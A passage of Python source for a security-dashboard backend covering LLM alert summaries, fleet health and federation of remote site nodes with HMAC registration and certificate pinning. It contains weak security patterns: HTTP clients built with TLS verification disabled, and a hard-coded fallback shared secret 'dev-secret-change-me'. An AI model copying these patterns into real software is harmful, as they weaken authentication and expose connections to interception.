        return JSONResponse(status_code=400, content={"error": "No alert data provided"})

    # Check LLM availability first
    llm_status = _llm_is_configured()
    if not llm_status["configured"]:
        return {"summary": llm_status["reason"], "error": True, "not_configured": True}

    llm_mode = os.getenv("LLM_MODE", "openai").strip().lower()

    # Build a focused prompt from the alert fields
    prompt = (
        f"Summarize this security detection concisely (3-5 sentences). "
        f"Explain what likely happened, assess the risk level, and recommend next steps.\n\n"
        f"Rule: {alert_data.get('rule_name', '') or alert_data.get('rule_id', 'Unknown')}\n"
        f"Rule ID: {alert_data.get('rule_id', '')}\n"
        f"Severity: {alert_data.get('severity', 'Unknown')}\n"
        f"Host: {alert_data.get('host', 'Unknown')}\n"
        f"Description: {alert_data.get('description', 'No description')}\n"
        f"Event Count: {alert_data.get('event_count', 0)}\n"
        f"Matched Events: {alert_data.get('matched_events', 0)}\n"
        f"First Seen: {alert_data.get('first_seen', 'N/A')}\n"
        f"Last Seen: {alert_data.get('last_seen', 'N/A')}\n"
        f"Timestamp: {alert_data.get('timestamp', 'N/A')}"
    )

    system_text = (
        "You are TinySocs Assistant. Summarise this security detection in plain, "
        "non-technical language. The user may not be a security expert.\n\n"
        "Write 2-3 short sentences: what happened in simple terms, how worried they "
        "should be (low/medium/high), and one clear next step.\n"
        "Do NOT list Event IDs, technical field names, or long bullet lists.\n"
        "Keep the entire summary under 80 words.\n\n"
        "You have tools to look up related events if it helps, but keep your answer brief.\n"
        "INDICES: tinysocs-alerts-* (field: 'timestamp'), tinysocs-winlog-* (field: '@timestamp')."
    )

    # Use a unique ephemeral session to avoid conflicts
    session_id = f"sum-{uuid.uuid4().hex[:8]}"
    ephemeral_messages: List[Dict[str, Any]] = []

    try:
        if llm_mode in ("anthropic", "claude"):
            result = _chat_anthropic(prompt, session_id, ephemeral_messages, system_text, _chat_call_tool_masked)
        elif llm_mode == "openai":
            result = _chat_openai(prompt, session_id, ephemeral_messages, system_text, _chat_call_tool_masked)
        elif llm_mode == "ollama":
            result = _chat_ollama(prompt, session_id, ephemeral_messages, system_text)
        else:
            return {"summary": "LLM not configured. Set LLM_MODE in Settings.", "error": True}
    except Exception as exc:
        return {"summary": f"LLM error: {type(exc).__name__}: {exc}", "error": True}
    finally:
        # Clean up ephemeral session
        _chat_sessions.pop(session_id, None)

    if result.get("error"):
        return {"summary": f"LLM error: {result['error']}", "error": True}

    return {"summary": result.get("reply", "No summary available."), "error": False}


@dashboard_app.get("/api/fleet/health")
async def api_fleet_health():
    """Fleet status: hosts, last seen, event counts, plus metadata."""
    if _DEMO_MODE:
        return _demo_fleet_health()
    body = {
        "query": {"range": {"@timestamp": {"gte": "now-24h", "lte": "now"}}},
        "aggs": {
            "by_host": {
                "terms": {"field": "winlog.computer_name", "size": 50},
                "aggs": {
                    "last_seen": {"max": {"field": "@timestamp"}},
                    "first_seen": {"min": {"field": "@timestamp"}},
                    "event_count": {"value_count": {"field": "@timestamp"}},
                },
            }
        },
    }
    # Run winlog + alerts queries in parallel via thread pool
    alert_body = {
        "query": {"range": {"timestamp": {"gte": "now-24h", "lte": "now"}}},
        "size": 50,
        "sort": [{"timestamp": {"order": "desc"}}],
        "aggs": {
            "by_host": {
                "terms": {"field": "source.computer_name.keyword", "size": 50},
                "aggs": {
                    "by_severity": {"terms": {"field": "alert.severity", "size": 5}},
                },
            }
        },
    }
    resp, alert_resp = await asyncio.gather(
        _safe_query_async("tinysocs-winlog-*", body),
        _safe_query_async("tinysocs-alerts-*", alert_body),
    )
    alert_counts: Dict[str, int] = {}
    alert_severities: Dict[str, Dict[str, int]] = {}
    for ab in alert_resp.get("aggregations", {}).get("by_host", {}).get("buckets", []):
        hname = ab["key"]
        alert_counts[hname] = ab["doc_count"]
        alert_severities[hname] = {
            s["key"]: s["doc_count"]
            for s in ab.get("by_severity", {}).get("buckets", [])
        }

    # Get recent detection names per host from the raw alert hits
    host_detections: Dict[str, List[str]] = {}
    for h in alert_resp.get("hits", {}).get("hits", []):
        src = h.get("_source", {})
        hname = src.get("source", {}).get("computer_name", "")
        rule = src.get("alert", {}).get("rule_name", "") or src.get("alert", {}).get("rule_id", "")
        if hname and rule and rule not in host_detections.get(hname, []):
            host_detections.setdefault(hname, []).append(rule)

    # Query heartbeat index for agent metadata (version, uptime, queue)
    heartbeat_data: Dict[str, Dict[str, Any]] = {}
    try:
        hb_body: Dict[str, Any] = {"query": {"match_all": {}}, "size": 50}
        hb_resp = await _safe_query_async("tinysocs-heartbeat", hb_body, size=50)
        for h in hb_resp.get("hits", {}).get("hits", []):
            src = h.get("_source", {})
            agent = src.get("agent", {})
            queue = src.get("queue", {})
            hname = agent.get("hostname", "")
            if hname:
                uptime_sec = agent.get("uptime_seconds", 0)
                uptime_str = ""
                if uptime_sec:
                    days, rem = divmod(int(uptime_sec), 86400)
                    hours_v, rem = divmod(rem, 3600)
                    mins_v = rem // 60
                    if days:
                        uptime_str = f"{days}d {hours_v}h {mins_v}m"
                    elif hours_v:
                        uptime_str = f"{hours_v}h {mins_v}m"
                    else:
                        uptime_str = f"{mins_v}m"
                heartbeat_data[hname] = {
                    "agent_version": agent.get("version", ""),
                    "node_id": agent.get("node_id", ""),
                    "uptime": uptime_str,
                    "events_shipped": queue.get("total_events_shipped", 0),
                    "queue_files": queue.get("file_count", 0),
                    "queue_bytes": queue.get("total_bytes", 0),
                    "last_ship_time": queue.get("last_ship_time", ""),
                    "heartbeat_ts": src.get("timestamp", ""),
                }
    except Exception:
        pass  # Heartbeat index may not exist yet

    hosts = []
    for b in resp.get("aggregations", {}).get("by_host", {}).get("buckets", []):
        hostname = b["key"]
        hb = heartbeat_data.get(hostname, {})
        hosts.append({
            "hostname": hostname,
            "event_count": b.get("event_count", {}).get("value", b["doc_count"]),
            "last_seen": b.get("last_seen", {}).get("value_as_string", ""),
            "first_seen": b.get("first_seen", {}).get("value_as_string", ""),
            "alert_count": alert_counts.get(hostname, 0),
            "alert_severities": alert_severities.get(hostname, {}),
            "active_detections": host_detections.get(hostname, [])[:5],
            "agent_version": hb.get("agent_version", ""),
            "uptime": hb.get("uptime", ""),
            "events_shipped": hb.get("events_shipped", 0),
            "queue_files": hb.get("queue_files", 0),
            "last_ship_time": hb.get("last_ship_time", ""),
            "heartbeat_ts": hb.get("heartbeat_ts", ""),
        })
    # --- Fan-out: merge hosts from all remote nodes (All Sites view) ---
    if _get_node_urls():
        remote_results = await _fan_out_nodes("fleet/health")
        for rd in remote_results:
            for rh in rd.get("hosts", []):
                # Avoid duplicates (remote host already present from local OS)
                if not any(h["hostname"] == rh.get("hostname") for h in hosts):
                    hosts.append({
                        "hostname": rh.get("hostname", ""),
                        "event_count": rh.get("event_count", 0),
                        "last_seen": rh.get("last_seen", ""),
                        "first_seen": rh.get("first_seen", ""),
                        "alert_count": rh.get("alert_count", 0),
                        "alert_severities": rh.get("alert_severities", {}),
                        "active_detections": rh.get("active_detections", [])[:5],
                        "agent_version": rh.get("agent_version", ""),
                        "uptime": rh.get("uptime", ""),
                        "events_shipped": rh.get("events_shipped", 0),
                        "queue_files": rh.get("queue_files", 0),
                        "last_ship_time": rh.get("last_ship_time", ""),
                        "heartbeat_ts": rh.get("heartbeat_ts", ""),
                    })

    return {"hosts": hosts, "error": resp.get("error")}


@dashboard_app.get("/api/fleet/host-detail")
async def api_fleet_host_detail(hostname: str = Query(...)):
    """Lazy-load detailed data for a single fleet host (top channels, event IDs)."""
    if _DEMO_MODE:
        fleet = _demo_fleet_health()
        for h in fleet.get("hosts", []):
            if h["hostname"].lower() == hostname.lower():
                return {
                    "hostname": hostname,
                    "top_channels": h.get("top_channels", []),
                    "top_event_ids": h.get("top_event_ids", []),
                }
        return {"hostname": hostname, "top_channels": [], "top_event_ids": []}
    body = {
        "query": {"bool": {"filter": [
            {"range": {"@timestamp": {"gte": "now-24h", "lte": "now"}}},
            {"term": {"winlog.computer_name": hostname}},
        ]}},
        "aggs": {
            "top_channels": {"terms": {"field": "winlog.channel", "size": 5}},
            "top_event_ids": {"terms": {"field": "event.code", "size": 5}},
        },
    }
    resp = await _safe_query_async("tinysocs-winlog-*", body, size=0)
    top_channels = [
        {"channel": ch["key"], "count": ch["doc_count"]}
        for ch in resp.get("aggregations", {}).get("top_channels", {}).get("buckets", [])
    ]
    top_events = [
        {"event_id": str(ev["key"]), "count": ev["doc_count"]}
        for ev in resp.get("aggregations", {}).get("top_event_ids", {}).get("buckets", [])
    ]
    return {"hostname": hostname, "top_channels": top_channels, "top_event_ids": top_events}


# ---------------------------------------------------------------------------
# Node / Sites API (Phase 17 M1 + Phase 18 M1 — Federation visibility)
# ---------------------------------------------------------------------------
_NODES_LIST: Optional[List[str]] = None
_node_id_to_url: Dict[str, str] = {}  # Phase 18 M3: cache for proxy lookups
_url_to_node_id: Dict[str, str] = {}  # Reverse mapping: persist node_id for unreachable sites


def _get_node_urls() -> List[str]:
    global _NODES_LIST
    if _NODES_LIST is None:
        raw = os.getenv("TINYSOCS_NODES", "").strip()
        _NODES_LIST = [u.strip() for u in raw.split(",") if u.strip()] if raw else []
    return _NODES_LIST


async def _fetch_node_json(client: Any, url: str, path: str) -> Optional[Dict[str, Any]]:
    """Fetch JSON from a node endpoint, returning None on any failure."""
    try:
        resp = await client.get(f"{url.rstrip('/')}{path}")
        return resp.json()
    except Exception as exc:
        print(f"[dashboard] _fetch_node_json FAILED: {url}{path} -- {type(exc).__name__}: {exc}", flush=True)
        return None


async def _fan_out_nodes(path: str, params: Optional[Dict[str, str]] = None, timeout: float = 8.0) -> List[Dict[str, Any]]:
    """Query *all* configured remote nodes in parallel, returning a list of non-None responses.

    Used by dashboard endpoints in the "All Sites" view to aggregate data
    from every federated Site.  The Hub's own local data is NOT included here
    (callers merge it separately).
    """
    node_urls = _get_node_urls()
    if not node_urls:
        return []
    import httpx
    qs = "&".join(f"{k}={v}" for k, v in (params or {}).items())
    suffix = f"?{qs}" if qs else ""
    results: List[Dict[str, Any]] = []
    try:
        async with httpx.AsyncClient(verify=False, timeout=timeout) as client:
            coros = [
                _fetch_node_json(client, url, f"/{path.lstrip('/')}{suffix}")
                for url in node_urls
            ]
            raw = await asyncio.gather(*coros, return_exceptions=True)
            for r in raw:
                if isinstance(r, dict):
                    results.append(r)
    except Exception as exc:
        print(f"[dashboard] _fan_out_nodes({path}) error: {exc}", flush=True)
    return results


@dashboard_app.get("/api/nodes")
async def api_nodes():
    """Return health, ledger, and operational status for all configured nodes."""
    if _DEMO_MODE:
        return _demo_nodes()

    node_urls = _get_node_urls()
    if not node_urls:
        return {"nodes": [], "aggregate": None}

    import asyncio as _aio
    import httpx
    from tinysocs.federation_certs import make_pinning_ssl_context, load_pinned_certs, get_cert_status
    nodes_out: List[Dict[str, Any]] = []
    _pinned = load_pinned_certs()

    # Build per-URL SSL contexts from pinned certs for federation security
    def _ssl_for(url: str) -> Any:
        if url in _pinned:
            return make_pinning_ssl_context(url)
        return False  # No pin yet (e.g. localhost self-node) -- permissive

    # Pre-check pinned cert fingerprints before making data requests.
    # This prevents MITM attacks on federation connections.
    from tinysocs.federation_certs import verify_site_cert
    _cert_statuses: Dict[str, str] = {}
    _blocked_urls: set = set()
    for url in node_urls:
        pin_status = get_cert_status(url) if url in _pinned else "unpinned"
        _cert_statuses[url] = pin_status
        if pin_status == "mismatch":
            mismatch_err = verify_site_cert(url)
            print(f"[SECURITY] {mismatch_err}", flush=True)
            _blocked_urls.add(url)

    async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
        for url in node_urls:
            node_info: Dict[str, Any] = {
                "url": url, "node_id": "", "version": "", "status": "unreachable",
                "ledger_sequence": 0, "ledger_head": "", "last_anchor_at": "",
                "last_anchor_items": 0, "reachable": False, "error": None,
                "cert_status": _cert_statuses.get(url, "unpinned"),
                # Phase 18 M1: operational data (null = not available)
                "alerts_24h": None, "alerts_critical": None, "alerts_high": None,
                "alerts_medium": None, "alerts_low": None,
                "top_rule": None, "host_count": None, "total_events_24h": None,
            }

            # SECURITY: refuse to connect to Sites with mismatched certs
            if url in _blocked_urls:
                node_info["error"] = "SECURITY: certificate mismatch -- connection refused (possible MITM)"
                node_info["status"] = "cert_mismatch"
                node_info["node_id"] = _url_to_node_id.get(url, "")
                nodes_out.append(node_info)
                continue

            # Fetch /meta, /evidence/head, /alerts/summary, /fleet/summary concurrently
            meta_data, head_data, alerts_data, fleet_data = await _aio.gather(
                _fetch_node_json(client, url, "/meta"),
                _fetch_node_json(client, url, "/evidence/head"),
                _fetch_node_json(client, url, "/alerts/summary"),
                _fetch_node_json(client, url, "/fleet/summary"),
            )

            # Process /meta
            if meta_data is None:
                node_info["error"] = f"Cannot reach {url}"
                # Use cached node_id from approval if available
                node_info["node_id"] = _url_to_node_id.get(url, "")
                # Fallback: node unreachable but we can still query OpenSearch
                # directly for alert and fleet data to populate the site card.
                try:
                    _ur_fb = {
                        "query": {"range": {"timestamp": {"gte": "now-24h", "lte": "now"}}},
                        "aggs": {
                            "by_severity": {"terms": {"field": "alert.severity", "size": 10}},
                            "by_rule": {"terms": {"field": "alert.rule_id", "size": 5, "order": {"_count": "desc"}}},
                        },
                    }
                    _ur_r = await _safe_query_async("tinysocs-alerts-*", _ur_fb)
                    if not _ur_r.get("error"):
                        _ur_total = _ur_r.get("hits", {}).get("total", {})
                        node_info["alerts_24h"] = _ur_total.get("value", 0) if isinstance(_ur_total, dict) else int(_ur_total)
                        _ur_sev = {b["key"].lower(): b["doc_count"] for b in _ur_r.get("aggregations", {}).get("by_severity", {}).get("buckets", [])}
                        node_info["alerts_critical"] = _ur_sev.get("critical", 0)
                        node_info["alerts_high"] = _ur_sev.get("high", 0)
                        node_info["alerts_medium"] = _ur_sev.get("medium", 0)
                        node_info["alerts_low"] = _ur_sev.get("low", 0)
                        _ur_rules = _ur_r.get("aggregations", {}).get("by_rule", {}).get("buckets", [])
                        node_info["top_rule"] = _ur_rules[0]["key"] if _ur_rules else ""
                except Exception:
                    pass
                try:
                    _ur_fl = {
                        "query": {"range": {"@timestamp": {"gte": "now-24h", "lte": "now"}}},
                        "aggs": {"by_host": {"terms": {"field": "winlog.computer_name", "size": 50}}},
                    }
                    _ur_fl_r = await _safe_query_async("tinysocs-winlog-*", _ur_fl)
                    if not _ur_fl_r.get("error"):
                        _ur_bkt = _ur_fl_r.get("aggregations", {}).get("by_host", {}).get("buckets", [])
                        node_info["host_count"] = len(_ur_bkt)
                        node_info["total_events_24h"] = sum(b.get("doc_count", 0) for b in _ur_bkt)
                except Exception:
                    pass
                nodes_out.append(node_info)
                continue

            node_info["node_id"] = meta_data.get("node_id", "")
            node_info["version"] = meta_data.get("version", "")
            node_info["reachable"] = True

            # Update bidirectional node_id ↔ url caches for proxy lookups
            if node_info["node_id"]:
                _node_id_to_url[node_info["node_id"]] = url
                _url_to_node_id[url] = node_info["node_id"]

            # Process /evidence/head
            if head_data and head_data.get("ok"):
                node_info["ledger_sequence"] = head_data.get("sequence", 0)
                node_info["ledger_head"] = head_data.get("head_sha256", "")

            # Process /alerts/summary (Phase 18 M1)
            if alerts_data and not alerts_data.get("error"):
                node_info["alerts_24h"] = alerts_data.get("total", 0)
                sev = alerts_data.get("severity", {})
                node_info["alerts_critical"] = sev.get("critical", 0)
                node_info["alerts_high"] = sev.get("high", 0)
                node_info["alerts_medium"] = sev.get("medium", 0)
                node_info["alerts_low"] = sev.get("low", 0)
                top_rules = alerts_data.get("top_rules", [])
                node_info["top_rule"] = top_rules[0]["rule"] if top_rules else ""
            elif node_info["reachable"]:
                # Fallback: node API returned error — query OpenSearch directly
                # using the dashboard's own connection (proven to work).
                try:
                    _fb = {
                        "query": {"range": {"timestamp": {"gte": "now-24h", "lte": "now"}}},
                        "aggs": {
                            "by_severity": {"terms": {"field": "alert.severity", "size": 10}},
                            "by_rule": {"terms": {"field": "alert.rule_id", "size": 5, "order": {"_count": "desc"}}},
                        },
                    }
                    _fb_r = await _safe_query_async("tinysocs-alerts-*", _fb)
                    if not _fb_r.get("error"):
                        _fb_total = _fb_r.get("hits", {}).get("total", {})
                        node_info["alerts_24h"] = _fb_total.get("value", 0) if isinstance(_fb_total, dict) else int(_fb_total)
                        _fb_sev = {b["key"].lower(): b["doc_count"] for b in _fb_r.get("aggregations", {}).get("by_severity", {}).get("buckets", [])}
                        node_info["alerts_critical"] = _fb_sev.get("critical", 0)
                        node_info["alerts_high"] = _fb_sev.get("high", 0)
                        node_info["alerts_medium"] = _fb_sev.get("medium", 0)
                        node_info["alerts_low"] = _fb_sev.get("low", 0)
                        _fb_rules = _fb_r.get("aggregations", {}).get("by_rule", {}).get("buckets", [])
                        node_info["top_rule"] = _fb_rules[0]["key"] if _fb_rules else ""
                except Exception:
                    pass

            # Process /fleet/summary (Phase 18 M1)
            if fleet_data and not fleet_data.get("error"):
                node_info["host_count"] = fleet_data.get("host_count", 0)
                node_info["total_events_24h"] = fleet_data.get("total_events_24h", 0)
            elif node_info["reachable"]:
                # Fallback: query winlog index directly for host count
                try:
                    _fl = {
                        "query": {"range": {"@timestamp": {"gte": "now-24h", "lte": "now"}}},
                        "aggs": {"by_host": {"terms": {"field": "winlog.computer_name", "size": 50}}},
                    }
                    _fl_r = await _safe_query_async("tinysocs-winlog-*", _fl)
                    if not _fl_r.get("error"):
                        _fl_bkt = _fl_r.get("aggregations", {}).get("by_host", {}).get("buckets", [])
                        node_info["host_count"] = len(_fl_bkt)
                        node_info["total_events_24h"] = sum(b.get("doc_count", 0) for b in _fl_bkt)
                except Exception:
                    pass

            # Query local anchors index for latest anchor for this node
            nid = node_info["node_id"]
            if nid:
                try:
                    anchor_body: Dict[str, Any] = {
                        "query": {"term": {"node_id": nid}},
                        "sort": [{"anchored_at": {"order": "desc"}}],
                    }
                    anchor_resp = _safe_query("tinysocs_anchors", anchor_body, size=1)
                    ahits = anchor_resp.get("hits", {}).get("hits", [])
                    if ahits:
                        asrc = ahits[0].get("_source", {})
                        node_info["last_anchor_at"] = asrc.get("anchored_at", "")
                        node_info["last_anchor_items"] = asrc.get("run", {}).get("items", 0)
                except Exception:
                    pass

            # Determine status
            if not node_info["reachable"]:
                node_info["status"] = "unreachable"
            elif node_info["last_anchor_at"]:
                try:
                    anchor_dt = datetime.fromisoformat(node_info["last_anchor_at"].replace("Z", "+00:00"))
                    age_hours = (datetime.now(timezone.utc) - anchor_dt).total_seconds() / 3600
                    node_info["status"] = "healthy" if age_hours < 1 else "warning"
                except Exception:
                    node_info["status"] = "healthy"
            else:
                node_info["status"] = "healthy"

            nodes_out.append(node_info)

    # Phase 18 M1: compute aggregate summary across all reachable nodes
    agg = {
        "total_alerts_24h": 0, "total_critical": 0, "total_high": 0,
        "total_medium": 0, "total_low": 0,
        "total_hosts": 0, "sites_healthy": 0, "sites_warning": 0,
        "sites_unreachable": 0,
    }
    for n in nodes_out:
        status = n.get("status", "unreachable")
        if status == "healthy":
            agg["sites_healthy"] += 1
        elif status == "warning":
            agg["sites_warning"] += 1
        else:
            agg["sites_unreachable"] += 1
        if n.get("alerts_24h") is not None:
            agg["total_alerts_24h"] += n["alerts_24h"]
        if n.get("alerts_critical") is not None:
            agg["total_critical"] += n["alerts_critical"]
        if n.get("alerts_high") is not None:
            agg["total_high"] += n["alerts_high"]
        if n.get("alerts_medium") is not None:
            agg["total_medium"] += n["alerts_medium"]
        if n.get("alerts_low") is not None:
            agg["total_low"] += n["alerts_low"]
        if n.get("host_count") is not None:
            agg["total_hosts"] += n["host_count"]

    return {"nodes": nodes_out, "aggregate": agg}


# ---------------------------------------------------------------------------
# Node Management — add / remove sites (Phase 20)
# ---------------------------------------------------------------------------

@dashboard_app.post("/api/nodes/add")
def api_nodes_add(body: Dict[str, Any] = Body(...)):
    """Add a remote site node URL to the federation."""
    global _NODES_LIST

    token = body.get("token", "")
    if not _validate_session(token):
        return JSONResponse(status_code=401, content={"error": "Unauthorized"})

    url = (body.get("url") or "").strip().rstrip("/")
    if not url:
        return JSONResponse(status_code=400, content={"error": "url is required"})

    # Basic validation
    if not url.startswith(("https://", "http://")):
        url = "https://" + url
    # Ensure port is present (default 8081)
    from urllib.parse import urlparse
    parsed = urlparse(url)
    if not parsed.port:
        url = f"{parsed.scheme}://{parsed.hostname}:8081"

    # Read current list from env (not cache, in case of manual edits)
    raw = os.getenv("TINYSOCS_NODES", "").strip()
    current = [u.strip() for u in raw.split(",") if u.strip()] if raw else []

    if url in current:
        return {"ok": True, "message": "Site already configured", "nodes": current}

    current.append(url)
    new_val = ",".join(current)

    # Persist to assistant.env
    env_path = _find_assistant_env()
    if env_path:
        try:
            _write_env_file(env_path, {"TINYSOCS_NODES": new_val})
        except Exception as exc:
            return JSONResponse(status_code=500, content={"error": f"Failed to write env file: {exc}"})

    # Update live environment + invalidate cache
    os.environ["TINYSOCS_NODES"] = new_val
    _NODES_LIST = None  # force re-read on next /api/nodes call

    return {"ok": True, "message": f"Site added: {url}", "nodes": current}


@dashboard_app.post("/api/nodes/remove")
def api_nodes_remove(body: Dict[str, Any] = Body(...)):
    """Remove a remote site node URL from the federation."""
    global _NODES_LIST

    token = body.get("token", "")
    if not _validate_session(token):
        return JSONResponse(status_code=401, content={"error": "Unauthorized"})

    url = (body.get("url") or "").strip().rstrip("/")
    if not url:
        return JSONResponse(status_code=400, content={"error": "url is required"})

    raw = os.getenv("TINYSOCS_NODES", "").strip()
    current = [u.strip() for u in raw.split(",") if u.strip()] if raw else []

    if url not in current:
        return {"ok": True, "message": "Site not found in list", "nodes": current}

    current = [u for u in current if u != url]
    new_val = ",".join(current)

    env_path = _find_assistant_env()
    if env_path:
        try:
            _write_env_file(env_path, {"TINYSOCS_NODES": new_val})
        except Exception as exc:
            return JSONResponse(status_code=500, content={"error": f"Failed to write env file: {exc}"})

    os.environ["TINYSOCS_NODES"] = new_val
    _NODES_LIST = None

    return {"ok": True, "message": f"Site removed: {url}", "nodes": current}


# ---------------------------------------------------------------------------
# Phase 21: Site auto-registration with Hub approval
# ---------------------------------------------------------------------------

_PENDING_FILE = Path(os.getenv("ProgramData", os.getenv("PROGRAMDATA", "C:\\ProgramData"))) / "TinySocs" / "Assistant" / "pending_sites.json"
_HUB_SHARED_SECRET: Optional[str] = None


def _get_hub_secret() -> str:
    """Load MASTER_SHARED_SECRET for HMAC verification of registration requests."""
    global _HUB_SHARED_SECRET
    if _HUB_SHARED_SECRET is None:
        _HUB_SHARED_SECRET = os.getenv("MASTER_SHARED_SECRET", "").strip()
        if not _HUB_SHARED_SECRET:
            # Try reading from assistant.env
            env_path = _find_assistant_env()
            if env_path and env_path.is_file():
                for line in env_path.read_text(encoding="utf-8", errors="replace").splitlines():
                    if line.startswith("MASTER_SHARED_SECRET="):
                        _HUB_SHARED_SECRET = line.split("=", 1)[1].strip()
                        break
        if not _HUB_SHARED_SECRET:
            _HUB_SHARED_SECRET = "dev-secret-change-me"
    return _HUB_SHARED_SECRET


def _verify_registration_hmac(request: Request) -> tuple:
    """Verify HMAC on a registration request from a Site node.
    Returns (ok: bool, reason: str) for logging failed attempts."""
    import time as _time
    ts = request.headers.get("X-TinySOCS-Timestamp", "")
    sig_hdr = request.headers.get("X-TinySOCS-Signature", "")
    if not ts or not sig_hdr:
        return False, "Missing X-TinySOCS-Timestamp or X-TinySOCS-Signature headers"
    try:
        ts_int = int(ts)
    except ValueError:
        return False, f"Invalid timestamp format: {ts!r}"
    skew = abs(int(_time.time()) - ts_int)
    if skew > 300:
        return False, f"Timestamp skew too large: {skew}s (max 300s) — check system clocks"
    # Normalise: strip "sha256=" prefix if present
    provided = sig_hdr.lower().strip()
    if provided.startswith("sha256="):
        provided = provided[7:]
    secret = _get_hub_secret()
    calc = hmac.new(secret.encode("utf-8"), ts.encode("utf-8"), hashlib.sha256).hexdigest().lower()
    if not hmac.compare_digest(calc, provided):
        return False, "HMAC mismatch — shared secret does not match between Hub and Site"
    return True, ""


def _load_pending_sites() -> dict:
    if _PENDING_FILE.is_file():
        try:
            return json.loads(_PENDING_FILE.read_text(encoding="utf-8"))
        except Exception:
            return {"sites": {}}
    return {"sites": {}}


def _save_pending_sites(data: dict) -> None:
    _PENDING_FILE.parent.mkdir(parents=True, exist_ok=True)
    _PENDING_FILE.write_text(json.dumps(data, indent=2), encoding="utf-8")


@dashboard_app.post("/api/nodes/register")
async def api_nodes_register(request: Request, body: Dict[str, Any] = Body(...)):
    """Receive auto-registration from a Site node (HMAC-authenticated)."""
    hmac_ok, hmac_reason = _verify_registration_hmac(request)
    if not hmac_ok:
        # Log the failure with detail so operators can diagnose
        node_id = (body.get("node_id") or "unknown") if isinstance(body, dict) else "unknown"
        client_ip = request.client.host if request.client else "unknown"
        print(f"[tinysocs-hub] Registration REJECTED from {node_id} ({client_ip}): {hmac_reason}", flush=True)
        # Store failed attempt in pending_sites.json so it shows on the dashboard
        try:
            pending = _load_pending_sites()
            if "sites" not in pending:
                pending["sites"] = {}
            fail_id = f"{node_id}" if node_id != "unknown" else f"unknown-{client_ip}"
            now = datetime.now(timezone.utc).isoformat()
            existing = pending["sites"].get(fail_id, {})
            pending["sites"][fail_id] = {
                "node_id": fail_id,
                "url": (body.get("url") or client_ip) if isinstance(body, dict) else client_ip,
                "version": (body.get("version") or "unknown") if isinstance(body, dict) else "unknown",
                "status": "auth_failed",
                "error": hmac_reason,
                "first_seen": existing.get("first_seen", now),
                "last_seen": now,
            }
            _save_pending_sites(pending)
        except Exception:
            pass
        return JSONResponse(status_code=401, content={"error": f"Registration failed: {hmac_reason}"})

    node_id = (body.get("node_id") or "").strip()
    url = (body.get("url") or "").strip().rstrip("/")
    version = body.get("version", "unknown")

    if not node_id or not url:
        return JSONResponse(status_code=400, content={"error": "node_id and url are required"})

    # Check if already approved (in TINYSOCS_NODES)
    raw = os.getenv("TINYSOCS_NODES", "").strip()
    current = [u.strip() for u in raw.split(",") if u.strip()] if raw else []
    if url in current:
        return {"status": "approved"}

    # Check pending/rejected status
    pending = _load_pending_sites()
    existing = pending.get("sites", {}).get(node_id)
    now = datetime.now(timezone.utc).isoformat()

    if existing and existing.get("status") == "rejected":
        return {"status": "rejected"}

    # Upsert as pending
    if "sites" not in pending:
        pending["sites"] = {}
    pending["sites"][node_id] = {
        "node_id": node_id,
        "url": url,
        "version": version,
        "status": "pending",
        "first_seen": existing["first_seen"] if existing else now,
        "last_seen": now,
    }
    _save_pending_sites(pending)

    return {"status": "pending"}


@dashboard_app.get("/api/nodes/pending")
async def api_nodes_pending(request: Request):
    """List pending site registrations (session-authenticated)."""
    auth = request.headers.get("Authorization", "")
    token = auth.replace("Bearer ", "") if auth.startswith("Bearer ") else ""
    if not _validate_session(token):
        return JSONResponse(status_code=401, content={"error": "Unauthorized"})

    pending = _load_pending_sites()
    sites = pending.get("sites", {})
    # Return pending and auth_failed (not rejected — those are intentionally hidden)
    pending_list = [v for v in sites.values() if v.get("status") in ("pending", "auth_failed")]
    return {"pending": pending_list}


@dashboard_app.post("/api/nodes/approve")
async def api_nodes_approve(body: Dict[str, Any] = Body(...)):
    """Approve a pending site — adds it to TINYSOCS_NODES."""
    global _NODES_LIST
    token = body.get("token", "")
    if not _validate_session(token):
        return JSONResponse(status_code=401, content={"error": "Unauthorized"})

    node_id = (body.get("node_id") or "").strip()
    if not node_id:
        return JSONResponse(status_code=400, content={"error": "node_id is required"})

    pending = _load_pending_sites()
    site = pending.get("sites", {}).get(node_id)
    if not site:
        return JSONResponse(status_code=404, content={"error": "Site not found in pending list"})

    url = site["url"]

    # Pin the Site's TLS certificate before approving
    from tinysocs.federation_certs import pin_site_cert
    try:
        pin_record = pin_site_cert(url, node_id)
    except ValueError as exc:
        return JSONResponse(status_code=400, content={"error": str(exc)})

    # Add to TINYSOCS_NODES (reuse add logic)
    raw = os.getenv("TINYSOCS_NODES", "").strip()
    current = [u.strip() for u in raw.split(",") if u.strip()] if raw else []
    if url not in current:
        current.append(url)
        new_val = ",".join(current)
        env_path = _find_assistant_env()
        if env_path:
            try:
                _write_env_file(env_path, {"TINYSOCS_NODES": new_val})
            except Exception:
                pass
        os.environ["TINYSOCS_NODES"] = new_val
        _NODES_LIST = None

    # Cache the node_id ↔ url mapping so unreachable sites still show names
    _url_to_node_id[url] = node_id
    if node_id:
        _node_id_to_url[node_id] = url

    # Remove from pending
    del pending["sites"][node_id]
    _save_pending_sites(pending)

    return {
        "ok": True, "status": "approved", "node_id": node_id, "url": url,
        "cert_pinned": True,
        "fingerprint": pin_record.get("fingerprint_sha256", "")[:20] + "...",
    }


@dashboard_app.post("/api/nodes/reject")
async def api_nodes_reject(body: Dict[str, Any] = Body(...)):
    """Reject a pending site registration."""
    token = body.get("token", "")
    if not _validate_session(token):
        return JSONResponse(status_code=401, content={"error": "Unauthorized"})

    node_id = (body.get("node_id") or "").strip()
    if not node_id:
        return JSONResponse(status_code=400, content={"error": "node_id is required"})

    pending = _load_pending_sites()
    site = pending.get("sites", {}).get(node_id)
    if not site:
        return JSONResponse(status_code=404, content={"error": "Site not found in pending list"})

    site["status"] = "rejected"
    _save_pending_sites(pending)

    return {"ok": True, "status": "rejected", "node_id": node_id}


# ---------------------------------------------------------------------------
# Site Proxy — drill-through to individual nodes (Phase 18 M3)
# ---------------------------------------------------------------------------
# Allowed proxy paths — only forward requests to known node endpoints.
_PROXY_ALLOWED = {
    "alerts/summary", "alerts/timeline", "fleet/summary", "fleet/health",
    "detections/fired", "events/recent", "host/timeline",
}


@dashboard_app.get("/api/site/{node_id}/{path:path}")
async def api_site_proxy(node_id: str, path: str, request: Request):
    """Proxy a request to a specific node's API.

    Only proxies to URLs listed in TINYSOCS_NODES.  Not an open proxy.
    In demo mode, dispatches to per-site demo data generators (M4).
    """
    # Normalise path (strip leading/trailing slashes)
    path = path.strip("/")

